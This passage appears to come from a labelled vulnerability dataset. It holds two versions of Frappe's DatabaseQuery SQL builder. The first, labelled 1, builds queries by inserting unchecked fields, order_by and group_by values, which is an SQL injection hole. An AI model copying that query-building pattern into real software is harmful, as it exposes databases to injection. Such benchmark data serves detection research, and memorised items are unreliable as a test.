columns:\n\t\t\t\t\tto_remove.append(fld)\n\n\t\tfor fld in to_remove:\n\t\t\tdel self.fields[self.fields.index(fld)]\n\n\t\t# remove from filters\n\t\tto_remove = []\n\t\tfor each in self.filters:\n\t\t\tif isinstance(each, basestring):\n\t\t\t\teach = [each]\n\n\t\t\tfor element in each:\n\t\t\t\tif element in optional_fields and element not in columns:\n\t\t\t\t\tto_remove.append(each)\n\n\t\tfor each in to_remove:\n\t\t\tif isinstance(self.filters, dict):\n\t\t\t\tdel self.filters[each]\n\t\t\telse:\n\t\t\t\tself.filters.remove(each)\n\n\tdef build_conditions(self):\n\t\tself.conditions = []\n\t\tself.grouped_or_conditions = []\n\t\tself.build_filter_conditions(self.filters, self.conditions)\n\t\tself.build_filter_conditions(self.or_filters, self.grouped_or_conditions)\n\n\t\t# match conditions\n\t\tif not self.flags.ignore_permissions:\n\t\t\tmatch_conditions = self.build_match_conditions()\n\t\t\tif match_conditions:\n\t\t\t\tself.conditions.append(\"(\" + match_conditions + \")\")\n\n\tdef build_filter_conditions(self, filters, conditions):\n\t\t\"\"\"build conditions from user filters\"\"\"\n\t\tif isinstance(filters, dict):\n\t\t\tfilters = [filters]\n\n\t\tfor f in filters:\n\t\t\tif isinstance(f, basestring):\n\t\t\t\tconditions.append(f)\n\t\t\telse:\n\t\t\t\tconditions.append(self.prepare_filter_condition(f))\n\n\tdef prepare_filter_condition(self, f):\n\t\t\"\"\"Returns a filter condition in the format:\n\n\t\t\t\tifnull(`tabDocType`.`fieldname`, fallback) operator \"value\"\n\t\t\"\"\"\n\n\t\tf = get_filter(self.doctype, f)\n\n\t\ttname = ('`tab' + f.doctype + '`')\n\t\tif not tname in self.tables:\n\t\t\tself.append_table(tname)\n\n\t\tif 'ifnull(' in f.fieldname:\n\t\t\tcolumn_name = f.fieldname\n\t\telse:\n\t\t\tcolumn_name = '{tname}.{fname}'.format(tname=tname,\n\t\t\t\tfname=f.fieldname)\n\n\t\tcan_be_null = True\n\n\t\t# prepare in condition\n\t\tif f.operator in ('in', 'not in'):\n\t\t\tvalues = f.value\n\t\t\tif not isinstance(values, (list, tuple)):\n\t\t\t\tvalues = values.split(\",\")\n\n\t\t\tfallback = \"''\"\n\t\t\tvalue = (frappe.db.escape((v or '').strip(), percent=False) for v in values)\n\t\t\tvalue = '(\"{0}\")'.format('\", \"'.join(value))\n\t\telse:\n\t\t\tdf = frappe.get_meta(f.doctype).get(\"fields\", {\"fieldname\": f.fieldname})\n\t\t\tdf = df[0] if df else None\n\n\t\t\tif df and df.fieldtype in (\"Check\", \"Float\", \"Int\", \"Currency\", \"Percent\"):\n\t\t\t\tcan_be_null = False\n\n\t\t\tif f.operator=='Between' and \\\n\t\t\t\t(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==\"Date\" or df.fieldtype==\"Datetime\"))):\n\t\t\t\tvalue = \"'%s' AND '%s'\" % (\n\t\t\t\t\tget_datetime(f.value[0]).strftime(\"%Y-%m-%d %H:%M:%S.%f\"),\n\t\t\t\t\tadd_to_date(get_datetime(f.value[1]),days=1).strftime(\"%Y-%m-%d %H:%M:%S.%f\"))\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\t\t\telif df and df.fieldtype==\"Date\":\n\t\t\t\tvalue = getdate(f.value).strftime(\"%Y-%m-%d\")\n\t\t\t\tfallback = \"'0000-00-00'\"\n\n\t\t\telif df and df.fieldtype==\"Datetime\":\n\t\t\t\tvalue = get_datetime(f.value).strftime(\"%Y-%m-%d %H:%M:%S.%f\")\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Time\":\n\t\t\t\tvalue = get_time(f.value).strftime(\"%H:%M:%S.%f\")\n\t\t\t\tfallback = \"'00:00:00'\"\n\n\t\t\telif f.operator in (\"like\", \"not like\") or (isinstance(f.value, basestring) and\n\t\t\t\t(not df or df.fieldtype not in [\"Float\", \"Int\", \"Currency\", \"Percent\", \"Check\"])):\n\t\t\t\t\tvalue = \"\" if f.value==None else f.value\n\t\t\t\t\tfallback = '\"\"'\n\n\t\t\t\t\tif f.operator in (\"like\", \"not like\") and isinstance(value, basestring):\n\t\t\t\t\t\t# because \"like\" uses backslash (\\) for escaping\n\t\t\t\t\t\tvalue = value.replace(\"\\\\\", \"\\\\\\\\\").replace(\"%\", \"%%\")\n\n\t\t\telse:\n\t\t\t\tvalue = flt(f.value)\n\t\t\t\tfallback = 0\n\n\t\t\t# put it inside double quotes\n\t\t\tif isinstance(value, basestring) and not f.operator=='Between':\n\t\t\t\tvalue = '\"{0}\"'.format(frappe.db.escape(value, percent=False))\n\n\t\tif (self.ignore_ifnull\n\t\t\tor not can_be_null\n\t\t\tor (f.value and f.operator in ('=', 'like'))\n\t\t\tor 'ifnull(' in column_name.lower()):\n\t\t\tcondition = '{column_name} {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, operator=f.operator,\n\t\t\t\tvalue=value)\n\t\telse:\n\t\t\tcondition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, fallback=fallback, operator=f.operator,\n\t\t\t\tvalue=value)\n\n\t\treturn condition\n\n\tdef build_match_conditions(self, as_condition=True):\n\t\t\"\"\"add match conditions if applicable\"\"\"\n\t\tself.match_filters = []\n\t\tself.match_conditions = []\n\t\tonly_if_shared = False\n\t\tif not self.user:\n\t\t\tself.user = frappe.session.user\n\n\t\tif not self.tables: self.extract_tables()\n\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\trole_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)\n\n\t\tself.shared = frappe.share.get_shared(self.doctype, self.user)\n\n\t\tif not meta.istable and not role_permissions.get(\"read\") and not self.flags.ignore_permissions:\n\t\t\tonly_if_shared = True\n\t\t\tif not self.shared:\n\t\t\t\tfrappe.throw(_(\"No permission to read {0}\").format(self.doctype), frappe.PermissionError)\n\t\t\telse:\n\t\t\t\tself.conditions.append(self.get_share_condition())\n\n\t\telse:\n\t\t\t# apply user permissions?\n\t\t\tif role_permissions.get(\"apply_user_permissions\", {}).get(\"read\"):\n\t\t\t\t# get user permissions\n\t\t\t\tuser_permissions = frappe.defaults.get_user_permissions(self.user)\n\t\t\t\tself.add_user_permissions(user_permissions,\n\t\t\t\t\tuser_permission_doctypes=role_permissions.get(\"user_permission_doctypes\").get(\"read\"))\n\n\t\t\tif role_permissions.get(\"if_owner\", {}).get(\"read\"):\n\t\t\t\tself.match_conditions.append(\"`tab{0}`.owner = '{1}'\".format(self.doctype,\n\t\t\t\t\tfrappe.db.escape(self.user, percent=False)))\n\n\t\tif as_condition:\n\t\t\tconditions = \"\"\n\t\t\tif self.match_conditions:\n\t\t\t\t# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))\n\t\t\t\tconditions = \"((\" + \") or (\".join(self.match_conditions) + \"))\"\n\n\t\t\tdoctype_conditions = self.get_permission_query_conditions()\n\t\t\tif doctype_conditions:\n\t\t\t\tconditions += (' and ' + doctype_conditions) if conditions else doctype_conditions\n\n\t\t\t# share is an OR condition, if there is a role permission\n\t\t\tif not only_if_shared and self.shared and conditions:\n\t\t\t\tconditions =  \"({conditions}) or ({shared_condition})\".format(\n\t\t\t\t\tconditions=conditions, shared_condition=self.get_share_condition())\n\n\t\t\treturn conditions\n\n\t\telse:\n\t\t\treturn self.match_filters\n\n\tdef get_share_condition(self):\n\t\treturn \"\"\"`tab{0}`.name in ({1})\"\"\".format(self.doctype, \", \".join([\"'%s'\"] * len(self.shared))) % \\\n\t\t\ttuple([frappe.db.escape(s, percent=False) for s in self.shared])\n\n\tdef add_user_permissions(self, user_permissions, user_permission_doctypes=None):\n\t\tuser_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)\n\t\tmeta = frappe.get_meta(self.doctype)\n\n\t\tfor doctypes in user_permission_doctypes:\n\t\t\tmatch_filters = {}\n\t\t\tmatch_conditions = []\n\t\t\t# check in links\n\t\t\tfor df in meta.get_fields_to_check_permissions(doctypes):\n\t\t\t\tuser_permission_values = user_permissions.get(df.options, [])\n\n\t\t\t\tcondition = 'ifnull(`tab{doctype}`.`{fieldname}`, \"\")=\"\"'.format(doctype=self.doctype, fieldname=df.fieldname)\n\t\t\t\tif user_permission_values:\n\t\t\t\t\tcondition += \"\"\" or `tab{doctype}`.`{fieldname}` in ({values})\"\"\".format(\n\t\t\t\t\t\tdoctype=self.doctype, fieldname=df.fieldname,\n\t\t\t\t\t\tvalues=\", \".join([('\"'+frappe.db.escape(v, percent=False)+'\"') for v in user_permission_values])\n\t\t\t\t\t)\n\t\t\t\tmatch_conditions.append(\"({condition})\".format(condition=condition))\n\n\t\t\t\tmatch_filters[df.options] = user_permission_values\n\n\t\t\tif match_conditions:\n\t\t\t\tself.match_conditions.append(\" and \".join(match_conditions))\n\n\t\t\tif match_filters:\n\t\t\t\tself.match_filters.append(match_filters)\n\n\tdef get_permission_query_conditions(self):\n\t\tcondition_methods = frappe.get_hooks(\"permission_query_conditions\", {}).get(self.doctype, [])\n\t\tif condition_methods:\n\t\t\tconditions = []\n\t\t\tfor method in condition_methods:\n\t\t\t\tc = frappe.call(frappe.get_attr(method), self.user)\n\t\t\t\tif c:\n\t\t\t\t\tconditions.append(c)\n\n\t\t\treturn \" and \".join(conditions) if conditions else None\n\n\tdef run_custom_query(self, query):\n\t\tif '%(key)s' in query:\n\t\t\tquery = query.replace('%(key)s', 'name')\n\t\treturn frappe.db.sql(query, as_dict = (not self.as_list))\n\n\tdef set_order_by(self, args):\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\tif self.order_by:\n\t\t\targs.order_by = self.order_by\n\t\telse:\n\t\t\targs.order_by = \"\"\n\n\t\t\t# don't add order by from meta if a mysql group function is used without group by clause\n\t\t\tgroup_function_without_group_by = (len(self.fields)==1 and\n\t\t\t\t(\tself.fields[0].lower().startswith(\"count(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"min(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"max(\")\n\t\t\t\t) and not self.group_by)\n\n\t\t\tif not group_function_without_group_by:\n\t\t\t\tsort_field = sort_order = None\n\t\t\t\tif meta.sort_field and ',' in meta.sort_field:\n\t\t\t\t\t# multiple sort given in doctype definition\n\t\t\t\t\t# Example:\n\t\t\t\t\t# `idx desc, modified desc`\n\t\t\t\t\t# will covert to\n\t\t\t\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\t\t\t\targs.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,\n\t\t\t\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\t\t\t\telse:\n\t\t\t\t\tsort_field = meta.sort_field or 'modified'\n\t\t\t\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\t\t\t\targs.order_by = \"`tab{0}`.`{1}` {2}\".format(self.doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t\t\t\t# draft docs always on top\n\t\t\t\tif meta.is_submittable:\n\t\t\t\t\targs.order_by = \"`tab{0}`.docstatus asc, {1}\".format(self.doctype, args.order_by)\n\n\tdef check_sort_by_table(self, order_by):\n\t\tif \".\" in order_by:\n\t\t\ttbl = order_by.split('.')[0]\n\t\t\tif tbl not in self.tables:\n\t\t\t\tif tbl.startswith('`'):\n\t\t\t\t\ttbl = tbl[4:-1]\n\t\t\t\tfrappe.throw(_(\"Please select atleast 1 column from {0} to sort\").format(tbl))\n\n\tdef add_limit(self):\n\t\tif self.limit_page_length:\n\t\t\treturn 'limit %s, %s' % (self.limit_start, self.limit_page_length)\n\t\telse:\n\t\t\treturn ''\n\n\tdef add_comment_count(self, result):\n\t\tfor r in result:\n\t\t\tif not r.name:\n\t\t\t\tcontinue\n\n\t\t\tr._comment_count = 0\n\t\t\tif \"_comments\" in r:\n\t\t\t\tr._comment_count = len(json.loads(r._comments or \"[]\"))\n\n\tdef update_list_settings(self):\n\t\t# update list settings if new search\n\t\tlist_settings = json.loads(get_list_settings(self.doctype) or '{}')\n\t\tlist_settings['filters'] = self.filters\n\t\tlist_settings['limit'] = self.limit_page_length\n\t\tlist_settings['order_by'] = self.order_by\n\n\t\tif self.save_list_settings_fields:\n\t\t\tlist_settings['fields'] = self.list_settings_fields\n\n\t\tupdate_list_settings(self.doctype, list_settings)\n\n/n/n/n", "label": 1}, {"id": "049d51cdf17b06168b4fe7672be8ce01fff0edd2", "code": "frappe/model/db_query.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\"\"\"build query for doclistview and return results\"\"\"\n\nimport frappe, json, copy\nimport frappe.defaults\nimport frappe.share\nimport frappe.permissions\nfrom frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date\nfrom frappe import _\nfrom frappe.model import optional_fields\nfrom frappe.model.utils.list_settings import get_list_settings, update_list_settings\n\nclass DatabaseQuery(object):\n\tdef __init__(self, doctype):\n\t\tself.doctype = doctype\n\t\tself.tables = []\n\t\tself.conditions = []\n\t\tself.or_conditions = []\n\t\tself.fields = None\n\t\tself.user = None\n\t\tself.ignore_ifnull = False\n\t\tself.flags = frappe._dict()\n\n\tdef execute(self, query=None, fields=None, filters=None, or_filters=None,\n\t\tdocstatus=None, group_by=None, order_by=None, limit_start=False,\n\t\tlimit_page_length=None, as_list=False, with_childnames=False, debug=False,\n\t\tignore_permissions=False, user=None, with_comment_count=False,\n\t\tjoin='left join', distinct=False, start=None, page_length=None, limit=None,\n\t\tignore_ifnull=False, save_list_settings=False, save_list_settings_fields=False,\n\t\tupdate=None, add_total_row=None):\n\t\tif not ignore_permissions and not frappe.has_permission(self.doctype, \"read\", user=user):\n\t\t\traise frappe.PermissionError, self.doctype\n\n\t\t# fitlers and fields swappable\n\t\t# its hard to remember what comes first\n\t\tif (isinstance(fields, dict)\n\t\t\tor (isinstance(fields, list) and fields and isinstance(fields[0], list))):\n\t\t\t# if fields is given as dict/list of list, its probably filters\n\t\t\tfilters, fields = fields, filters\n\n\t\telif fields and isinstance(filters, list) \\\n\t\t\tand len(filters) > 1 and isinstance(filters[0], basestring):\n\t\t\t# if `filters` is a list of strings, its probably fields\n\t\t\tfilters, fields = fields, filters\n\n\t\tif fields:\n\t\t\tself.fields = fields\n\t\telse:\n\t\t\tself.fields =  [\"`tab{0}`.`name`\".format(self.doctype)]\n\n\t\tif start: limit_start = start\n\t\tif page_length: limit_page_length = page_length\n\t\tif limit: limit_page_length = limit\n\n\t\tself.filters = filters or []\n\t\tself.or_filters = or_filters or []\n\t\tself.docstatus = docstatus or []\n\t\tself.group_by = group_by\n\t\tself.order_by = order_by\n\t\tself.limit_start = 0 if (limit_start is False) else cint(limit_start)\n\t\tself.limit_page_length = cint(limit_page_length) if limit_page_length else None\n\t\tself.with_childnames = with_childnames\n\t\tself.debug = debug\n\t\tself.join = join\n\t\tself.distinct = distinct\n\t\tself.as_list = as_list\n\t\tself.ignore_ifnull = ignore_ifnull\n\t\tself.flags.ignore_permissions = ignore_permissions\n\t\tself.user = user or frappe.session.user\n\t\tself.update = update\n\t\tself.list_settings_fields = copy.deepcopy(self.fields)\n\t\t#self.debug = True\n\n\t\tif query:\n\t\t\tresult = self.run_custom_query(query)\n\t\telse:\n\t\t\tresult = self.build_and_run()\n\n\t\tif with_comment_count and not as_list and self.doctype:\n\t\t\tself.add_comment_count(result)\n\n\t\tif save_list_settings:\n\t\t\tself.save_list_settings_fields = save_list_settings_fields\n\t\t\tself.update_list_settings()\n\n\t\treturn result\n\n\tdef build_and_run(self):\n\t\targs = self.prepare_args()\n\t\targs.limit = self.add_limit()\n\n\t\tif args.conditions:\n\t\t\targs.conditions = \"where \" + args.conditions\n\n\t\tif self.distinct:\n\t\t\targs.fields = 'distinct ' + args.fields\n\n\t\tquery = \"\"\"select %(fields)s from %(tables)s %(conditions)s\n\t\t\t%(group_by)s %(order_by)s %(limit)s\"\"\" % args\n\n\t\treturn frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)\n\n\tdef prepare_args(self):\n\t\tself.parse_args()\n\t\tself.extract_tables()\n\t\tself.set_optional_columns()\n\t\tself.build_conditions()\n\n\t\targs = frappe._dict()\n\n\t\tif self.with_childnames:\n\t\t\tfor t in self.tables:\n\t\t\t\tif t != \"`tab\" + self.doctype + \"`\":\n\t\t\t\t\tself.fields.append(t + \".name as '%s:name'\" % t[4:-1])\n\n\t\t# query dict\n\t\targs.tables = self.tables[0]\n\n\t\t# left join parent, child tables\n\t\tfor child in self.tables[1:]:\n\t\t\targs.tables += \" {join} {child} on ({child}.parent = {main}.name)\".format(join=self.join,\n\t\t\t\tchild=child, main=self.tables[0])\n\n\t\tif self.grouped_or_conditions:\n\t\t\tself.conditions.append(\"({0})\".format(\" or \".join(self.grouped_or_conditions)))\n\n\t\targs.conditions = ' and '.join(self.conditions)\n\n\t\tif self.or_conditions:\n\t\t\targs.conditions += (' or ' if args.conditions else \"\") + \\\n\t\t\t\t ' or '.join(self.or_conditions)\n\n\t\tself.set_field_tables()\n\n\t\targs.fields = ', '.join(self.fields)\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\tself.set_order_by(args, meta)\n\t\tself.validate_order_by_and_group_by_params(args.order_by, meta)\n\t\targs.order_by = args.order_by and (\" order by \" + args.order_by) or \"\"\n\n\t\tself.validate_order_by_and_group_by_params(self.group_by, meta)\n\t\targs.group_by = self.group_by and (\" group by \" + self.group_by) or \"\"\n\n\t\treturn args\n\n\tdef parse_args(self):\n\t\t\"\"\"Convert fields and filters from strings to list, dicts\"\"\"\n\t\tif isinstance(self.fields, basestring):\n\t\t\tif self.fields == \"*\":\n\t\t\t\tself.fields = [\"*\"]\n\t\t\telse:\n\t\t\t\ttry:\n\t\t\t\t\tself.fields = json.loads(self.fields)\n\t\t\t\texcept ValueError:\n\t\t\t\t\tself.fields = [f.strip() for f in self.fields.split(\",\")]\n\n\t\tfor filter_name in [\"filters\", \"or_filters\"]:\n\t\t\tfilters = getattr(self, filter_name)\n\t\t\tif isinstance(filters, basestring):\n\t\t\t\tfilters = json.loads(filters)\n\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfdict = filters\n\t\t\t\tfilters = []\n\t\t\t\tfor key, value in fdict.iteritems():\n\t\t\t\t\tfilters.append(make_filter_tuple(self.doctype, key, value))\n\t\t\tsetattr(self, filter_name, filters)\n\n\tdef extract_tables(self):\n\t\t\"\"\"extract tables from fields\"\"\"\n\t\tself.tables = ['`tab' + self.doctype + '`']\n\n\t\t# add tables from fields\n\t\tif self.fields:\n\t\t\tfor f in self.fields:\n\t\t\t\tif ( not (\"tab\" in f and \".\" in f) ) or (\"locate(\" in f): continue\n\n\n\t\t\t\ttable_name = f.split('.')[0]\n\t\t\t\tif table_name.lower().startswith('group_concat('):\n\t\t\t\t\ttable_name = table_name[13:]\n\t\t\t\tif table_name.lower().startswith('ifnull('):\n\t\t\t\t\ttable_name = table_name[7:]\n\t\t\t\tif not table_name[0]=='`':\n\t\t\t\t\ttable_name = '`' + table_name + '`'\n\t\t\t\tif not table_name in self.tables:\n\t\t\t\t\tself.append_table(table_name)\n\n\tdef append_table(self, table_name):\n\t\tself.tables.append(table_name)\n\t\tdoctype = table_name[4:-1]\n\t\tif (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):\n\t\t\traise frappe.PermissionError, doctype\n\n\tdef set_field_tables(self):\n\t\t'''If there are more than one table, the fieldname must not be ambigous.\n\t\tIf the fieldname is not explicitly mentioned, set the default table'''\n\t\tif len(self.tables) > 1:\n\t\t\tfor i, f in enumerate(self.fields):\n\t\t\t\tif '.' not in f:\n\t\t\t\t\tself.fields[i] = '{0}.{1}'.format(self.tables[0], f)\n\n\tdef set_optional_columns(self):\n\t\t\"\"\"Removes optional columns like `_user_tags`, `_comments` etc. if not in table\"\"\"\n\t\tcolumns = frappe.db.get_table_columns(self.doctype)\n\n\t\t# remove from fields\n\t\tto_remove = []\n\t\tfor fld in self.fields:\n\t\t\tfor f in optional_fields:\n\t\t\t\tif f in fld and not f in columns:\n\t\t\t\t\tto_remove.append(fld)\n\n\t\tfor fld in to_remove:\n\t\t\tdel self.fields[self.fields.index(fld)]\n\n\t\t# remove from filters\n\t\tto_remove = []\n\t\tfor each in self.filters:\n\t\t\tif isinstance(each, basestring):\n\t\t\t\teach = [each]\n\n\t\t\tfor element in each:\n\t\t\t\tif element in optional_fields and element not in columns:\n\t\t\t\t\tto_remove.append(each)\n\n\t\tfor each in to_remove:\n\t\t\tif isinstance(self.filters, dict):\n\t\t\t\tdel self.filters[each]\n\t\t\telse:\n\t\t\t\tself.filters.remove(each)\n\n\tdef build_conditions(self):\n\t\tself.conditions = []\n\t\tself.grouped_or_conditions = []\n\t\tself.build_filter_conditions(self.filters, self.conditions)\n\t\tself.build_filter_conditions(self.or_filters, self.grouped_or_conditions)\n\n\t\t# match conditions\n\t\tif not self.flags.ignore_permissions:\n\t\t\tmatch_conditions = self.build_match_conditions()\n\t\t\tif match_conditions:\n\t\t\t\tself.conditions.append(\"(\" + match_conditions + \")\")\n\n\tdef build_filter_conditions(self, filters, conditions):\n\t\t\"\"\"build conditions from user filters\"\"\"\n\t\tif isinstance(filters, dict):\n\t\t\tfilters = [filters]\n\n\t\tfor f in filters:\n\t\t\tif isinstance(f, basestring):\n\t\t\t\tconditions.append(f)\n\t\t\telse:\n\t\t\t\tconditions.append(self.prepare_filter_condition(f))\n\n\tdef prepare_filter_condition(self, f):\n\t\t\"\"\"Returns a filter condition in the format:\n\n\t\t\t\tifnull(`tabDocType`.`fieldname`, fallback) operator \"value\"\n\t\t\"\"\"\n\n\t\tf = get_filter(self.doctype, f)\n\n\t\ttname = ('`tab' + f.doctype + '`')\n\t\tif not tname in self.tables:\n\t\t\tself.append_table(tname)\n\n\t\tif 'ifnull(' in f.fieldname:\n\t\t\tcolumn_name = f.fieldname\n\t\telse:\n\t\t\tcolumn_name = '{tname}.{fname}'.format(tname=tname,\n\t\t\t\tfname=f.fieldname)\n\n\t\tcan_be_null = True\n\n\t\t# prepare in condition\n\t\tif f.operator in ('in', 'not in'):\n\t\t\tvalues = f.value\n\t\t\tif not isinstance(values, (list, tuple)):\n\t\t\t\tvalues = values.split(\",\")\n\n\t\t\tfallback = \"''\"\n\t\t\tvalue = (frappe.db.escape((v or '').strip(), percent=False) for v in values)\n\t\t\tvalue = '(\"{0}\")'.format('\", \"'.join(value))\n\t\telse:\n\t\t\tdf = frappe.get_meta(f.doctype).get(\"fields\", {\"fieldname\": f.fieldname})\n\t\t\tdf = df[0] if df else None\n\n\t\t\tif df and df.fieldtype in (\"Check\", \"Float\", \"Int\", \"Currency\", \"Percent\"):\n\t\t\t\tcan_be_null = False\n\n\t\t\tif f.operator=='Between' and \\\n\t\t\t\t(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==\"Date\" or df.fieldtype==\"Datetime\"))):\n\t\t\t\tvalue = \"'%s' AND '%s'\" % (\n\t\t\t\t\tget_datetime(f.value[0]).strftime(\"%Y-%m-%d %H:%M:%S.%f\"),\n\t\t\t\t\tadd_to_date(get_datetime(f.value[1]),days=1).strftime(\"%Y-%m-%d %H:%M:%S.%f\"))\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\t\t\telif df and df.fieldtype==\"Date\":\n\t\t\t\tvalue = getdate(f.value).strftime(\"%Y-%m-%d\")\n\t\t\t\tfallback = \"'0000-00-00'\"\n\n\t\t\telif df and df.fieldtype==\"Datetime\":\n\t\t\t\tvalue = get_datetime(f.value).strftime(\"%Y-%m-%d %H:%M:%S.%f\")\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Time\":\n\t\t\t\tvalue = get_time(f.value).strftime(\"%H:%M:%S.%f\")\n\t\t\t\tfallback = \"'00:00:00'\"\n\n\t\t\telif f.operator in (\"like\", \"not like\") or (isinstance(f.value, basestring) and\n\t\t\t\t(not df or df.fieldtype not in [\"Float\", \"Int\", \"Currency\", \"Percent\", \"Check\"])):\n\t\t\t\t\tvalue = \"\" if f.value==None else f.value\n\t\t\t\t\tfallback = '\"\"'\n\n\t\t\t\t\tif f.operator in (\"like\", \"not like\") and isinstance(value, basestring):\n\t\t\t\t\t\t# because \"like\" uses backslash (\\) for escaping\n\t\t\t\t\t\tvalue = value.replace(\"\\\\\", \"\\\\\\\\\").replace(\"%\", \"%%\")\n\n\t\t\telse:\n\t\t\t\tvalue = flt(f.value)\n\t\t\t\tfallback = 0\n\n\t\t\t# put it inside double quotes\n\t\t\tif isinstance(value, basestring) and not f.operator=='Between':\n\t\t\t\tvalue = '\"{0}\"'.format(frappe.db.escape(value, percent=False))\n\n\t\tif (self.ignore_ifnull\n\t\t\tor not can_be_null\n\t\t\tor (f.value and f.operator in ('=', 'like'))\n\t\t\tor 'ifnull(' in column_name.lower()):\n\t\t\tcondition = '{column_name} {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, operator=f.operator,\n\t\t\t\tvalue=value)\n\t\telse:\n\t\t\tcondition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, fallback=fallback, operator=f.operator,\n\t\t\t\tvalue=value)\n\n\t\treturn condition\n\n\tdef build_match_conditions(self, as_condition=True):\n\t\t\"\"\"add match conditions if applicable\"\"\"\n\t\tself.match_filters = []\n\t\tself.match_conditions = []\n\t\tonly_if_shared = False\n\t\tif not self.user:\n\t\t\tself.user = frappe.session.user\n\n\t\tif not self.tables: self.extract_tables()\n\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\trole_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)\n\n\t\tself.shared = frappe.share.get_shared(self.doctype, self.user)\n\n\t\tif not meta.istable and not role_permissions.get(\"read\") and not self.flags.ignore_permissions:\n\t\t\tonly_if_shared = True\n\t\t\tif not self.shared:\n\t\t\t\tfrappe.throw(_(\"No permission to read {0}\").format(self.doctype), frappe.PermissionError)\n\t\t\telse:\n\t\t\t\tself.conditions.append(self.get_share_condition())\n\n\t\telse:\n\t\t\t# apply user permissions?\n\t\t\tif role_permissions.get(\"apply_user_permissions\", {}).get(\"read\"):\n\t\t\t\t# get user permissions\n\t\t\t\tuser_permissions = frappe.defaults.get_user_permissions(self.user)\n\t\t\t\tself.add_user_permissions(user_permissions,\n\t\t\t\t\tuser_permission_doctypes=role_permissions.get(\"user_permission_doctypes\").get(\"read\"))\n\n\t\t\tif role_permissions.get(\"if_owner\", {}).get(\"read\"):\n\t\t\t\tself.match_conditions.append(\"`tab{0}`.owner = '{1}'\".format(self.doctype,\n\t\t\t\t\tfrappe.db.escape(self.user, percent=False)))\n\n\t\tif as_condition:\n\t\t\tconditions = \"\"\n\t\t\tif self.match_conditions:\n\t\t\t\t# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))\n\t\t\t\tconditions = \"((\" + \") or (\".join(self.match_conditions) + \"))\"\n\n\t\t\tdoctype_conditions = self.get_permission_query_conditions()\n\t\t\tif doctype_conditions:\n\t\t\t\tconditions += (' and ' + doctype_conditions) if conditions else doctype_conditions\n\n\t\t\t# share is an OR condition, if there is a role permission\n\t\t\tif not only_if_shared and self.shared and conditions:\n\t\t\t\tconditions =  \"({conditions}) or ({shared_condition})\".format(\n\t\t\t\t\tconditions=conditions, shared_condition=self.get_share_condition())\n\n\t\t\treturn conditions\n\n\t\telse:\n\t\t\treturn self.match_filters\n\n\tdef get_share_condition(self):\n\t\treturn \"\"\"`tab{0}`.name in ({1})\"\"\".format(self.doctype, \", \".join([\"'%s'\"] * len(self.shared))) % \\\n\t\t\ttuple([frappe.db.escape(s, percent=False) for s in self.shared])\n\n\tdef add_user_permissions(self, user_permissions, user_permission_doctypes=None):\n\t\tuser_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)\n\t\tmeta = frappe.get_meta(self.doctype)\n\n\t\tfor doctypes in user_permission_doctypes:\n\t\t\tmatch_filters = {}\n\t\t\tmatch_conditions = []\n\t\t\t# check in links\n\t\t\tfor df in meta.get_fields_to_check_permissions(doctypes):\n\t\t\t\tuser_permission_values = user_permissions.get(df.options, [])\n\n\t\t\t\tcondition = 'ifnull(`tab{doctype}`.`{fieldname}`, \"\")=\"\"'.format(doctype=self.doctype, fieldname=df.fieldname)\n\t\t\t\tif user_permission_values:\n\t\t\t\t\tcondition += \"\"\" or `tab{doctype}`.`{fieldname}` in ({values})\"\"\".format(\n\t\t\t\t\t\tdoctype=self.doctype, fieldname=df.fieldname,\n\t\t\t\t\t\tvalues=\", \".join([('\"'+frappe.db.escape(v, percent=False)+'\"') for v in user_permission_values])\n\t\t\t\t\t)\n\t\t\t\tmatch_conditions.append(\"({condition})\".format(condition=condition))\n\n\t\t\t\tmatch_filters[df.options] = user_permission_values\n\n\t\t\tif match_conditions:\n\t\t\t\tself.match_conditions.append(\" and \".join(match_conditions))\n\n\t\t\tif match_filters:\n\t\t\t\tself.match_filters.append(match_filters)\n\n\tdef get_permission_query_conditions(self):\n\t\tcondition_methods = frappe.get_hooks(\"permission_query_conditions\", {}).get(self.doctype, [])\n\t\tif condition_methods:\n\t\t\tconditions = []\n\t\t\tfor method in condition_methods:\n\t\t\t\tc = frappe.call(frappe.get_attr(method), self.user)\n\t\t\t\tif c:\n\t\t\t\t\tconditions.append(c)\n\n\t\t\treturn \" and \".join(conditions) if conditions else None\n\n\tdef run_custom_query(self, query):\n\t\tif '%(key)s' in query:\n\t\t\tquery = query.replace('%(key)s', 